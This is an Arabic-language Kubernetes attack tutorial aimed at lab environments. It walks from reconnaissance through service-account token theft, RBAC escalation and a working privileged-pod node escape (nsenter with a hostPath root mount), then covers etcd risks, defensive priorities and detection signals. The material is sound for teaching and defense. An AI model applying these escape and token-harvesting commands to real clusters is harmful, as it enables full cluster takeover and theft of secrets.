# اختراق كوبرنيتيس: من "الحاوية" إلى السيطرة الكاملة على الـ Cluster

المنصات الحديثة بقت هي المخزن الحقيقي لكل الـ Credentials والـ Secrets، وهي أسرع طريق للوصول لكل البيانات والخدمات داخل الـ Cluster. في الدرس ده، هنمشي مع المهاجم خطوة بخطوة: من أول ما يدخل لـ Pod بسيط، لحد ما يسيطر بالكامل على الـ Control Plane. هنعرف إيه هي الثغرات القاتلة اللي لازم المدافعين يسدوها فوراً.

> [!warning] تنبيه هام
> طبق التقنيات دي فقط في بيئة معملية (Lab) زي KubeGoat أو Kubernetes Goat. أي تعديل غلط في صلاحيات الـ RBAC على Cluster حقيقي ممكن يوقف الشغل ويسبب كارثة.

## إزاي المهاجم بيشوف الـ Cluster؟ (Threat Model)

![بيئة هجوم كوبرنيتيس](/images/lessons/kubernetes_attack_surface_en.png)

عندنا 5 مداخل رئيسية لأي هجوم:
1. تسريب ملفات الـ **kubeconfig**.
2. الـ **APIs** أو لوحات التحكم المكشوفة للإنترنت.
3. التطبيقات الضعيفة اللي شغالة جوه الـ Cluster.
4. الـ **kubelet** لو مش متأمن كويس.
5. الصور (**Images**) الملغمة في مراحل الـ Supply Chain.

## 1. الاستطلاع (Reconnaissance) — إيه اللي مكشوف بره؟

أول حاجة المهاجم بيعملها هي إنه يدور على أي ثغرة في الـ API Server المكشوف:

```terminal
# البحث عن واجهات برمجة تطبيقات Kubernetes المكشوفة
shodan search 'product:"Kubernetes"'
shodan search 'http.title:"Kubernetes Dashboard"'

# لو لقيت عنوان IP، جرب تشوف هل مسموح بالدخول المجهول (Anonymous Auth)؟
kubectl --insecure-skip-tls-verify --server=https://API:6443 get nodes

# لو اشتغلت معاك، شوف صلاحياتك إيه بالظبط:
kubectl --insecure-skip-tls-verify --server=https://API:6443 auth can-i --list
```

## 2. من اختراق الـ Pod للسيطرة على الـ Cluster (Pod RCE → Cluster)

لو المهاجم قدر يخترق تطبيق شغال جوه Pod (مثلاً عن طريق SSRF)، أول حاجة بيعملها هي إنه يلم معلومات من جوه الـ Pod نفسه:

```terminal
# تجميع الـ Token والمعلومات الأساسية
ls /var/run/secrets/kubernetes.io/serviceaccount/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# فحص صلاحيات الـ Service Account الحالي
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -X POST -H 'Content-Type: application/json' \
  -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}"
```

## 3. ثغرات الـ RBAC — إزاي تصعد صلاحياتك؟

الـ RBAC هو اللي بيحدد مين يعمل إيه. فيه صلاحيات لو لقيتها، فأنت تقريباً بقيت Root على الـ Cluster:

| الصلاحية (Verb) | ليه هي خطيرة جداً؟ |
|------------------|---------------------|
| `create pods` | تقدر تشغل Pod جديد وتوصل منه لملفات الـ Host وتهرب للـ Node. |
| `get/list secrets` | هتقرأ كل الـ Tokens، وممكن تلاقي Token بتاع Admin. |
| `impersonate` | تقدر تتقمص شخصية أي مستخدم تاني، حتى الـ Cluster Admin. |
| `bind` | تقدر تربط نفسك بدور (Role) عالي جداً. |

**مثال: الهروب للـ Node عن طريق `create pods`**

```terminal
# تشغيل Pod بـ Privileged Mode بيوصل لملفات الـ Host
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata: { name: pwn, namespace: default }
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    command: ["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","sh"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes: [{ name: host, hostPath: { path: / } }]
EOF

kubectl exec -it pwn -- sh
# مبروك، أنت دلوقتي Root على الـ Node المضيفة.
```

## 4. فنون الهروب من الـ Pod (Escape Techniques)

حتى لو الـ Cluster متأمن بـ Policies تمنع الـ `privileged: true` برضه فيه طرق تانية للهروب:

- **hostNetwork: true**: تقدر تكلم الـ kubelet مباشرة أو الـ Cloud Metadata (IMDS).
- **hostPath: /mount**: تقدر تكتب في ملفات الـ Cron أو تضيف مفتاح SSH بتاعك للـ Root.
- **Docker Socket**: لو لقيت `/var/run/docker.sock` ممرر للـ Pod، تقدر تشغل أي حاوية تانية وتتحكم في الـ Host.

## 5. الـ etcd: "الخزنة" اللي فيها كل حاجة

الـ etcd هو المكان اللي بيتخزن فيه كل أسرار الـ Cluster. لو المهاجم وصل له (بورت 2379) من غير حماية، اللعبة خلصت.

> [!danger] قاعدة ذهبية
> الوصول للـ etcd يعني السيطرة الكاملة. لازم تعامل ملفات الـ etcd بنفس الحذر اللي بتعامل بيه الـ NTDS.dit في الـ Active Directory.

## 6. أولويات الدفاع (إزاي تسد الثغرات دي؟)

1. **اقفل الـ Anonymous Auth**: اتأكد إن الـ API Server والـ kubelet مش مسموح لأي حد مجهول يدخل عليهم.
2. **استخدم Pod Security**: امنع الـ Privileged Pods والـ hostPath تماماً.
3. **التقسيم الشبكي (Network Policies)**: امنع الـ Pods إنها تكلم بعضها إلا في أضيق الحدود (Default-Deny).
4. **شفر الـ Secrets**: اتأكد إن الـ Secrets متشفرة وهي متخزنة (At Rest) باستخدام KMS.
5. **راقب الـ Audit Logs**: لازم تنبه لو حد عمل `secrets/get` أو `exec` في وقت غير معتاد.

## ملخص الرصد (Detection)

| المصدر | إيه اللي تراقبه؟ |
|-----------|-----------|
| **Audit Logs** | أي استخدام لأمر `exec` في بيئة الـ Production. |
| **API Server** | محاولات قراءة الـ Secrets من حسابات خدمة مش محتاجاها. |
| **Node Logs** | إنشاء أي Pod بيستخدم الـ `hostPath` بمسار `/`. |
| **Network Traffic** | أي تواصل مع بورت 2379 (etcd) من بره الـ Control Plane. |
